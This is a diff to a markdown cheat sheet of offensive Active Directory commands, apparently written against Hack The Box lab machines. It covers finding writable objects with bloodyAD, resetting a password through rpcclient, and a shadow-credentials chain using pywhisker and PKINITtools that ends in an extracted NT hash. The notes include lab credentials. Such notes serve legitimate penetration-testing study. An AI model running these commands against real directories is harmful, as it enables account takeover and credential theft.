@@ -14,19 +14,29 @@ Set-DomainUserPassword -Identity USER_TO_CHANGE_PASS -AccountPassword $PASS_OBJE
 
 ### From linux
 
+## Get All users you can write to
+
+```bash
+bloodyAD -d HERCULES.HTB -k --dc-ip 10.10.11.91 get writable
+```
+
 #### rpc
+
 ```bash
 rpcclient> setuserinfo UserName 23 password
                                 ^
 ```
 
 ## Shadow Credentials
+
 https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204
 
 ```bash
 py ~/tools/pywhisker.py -u judith.mader -p judith09 -d certified.htb --dc-ip 10.10.11.41 -t management_svc -a add --filename mngmnt_svc --export PEM
 ```
-After that 
+
+After that
+
 ```bash
 py ~/tools/active_directory/PKINITtools/gettgtpkinit.py -cert-pem mngmnt_svc_cert.pem -key-pem mngmnt_svc_priv.pem certified.htb/management_svc management_svc.ccache
 
@@ -45,6 +55,7 @@ INFO:minikerberos:Saved TGT to file
 ```
 
 You can now get the nthash from the ticket like
+
 ```bash
 export KRB5CCNAME=management_svc1.ccache; py ~/tools/active_directory/PKINITtools/getnthash.py -key c34a6506882b9090ea6af6d5f294d37d8145575d3981913d24e16827fe1421d5 certified.htb/management_svc
 ```
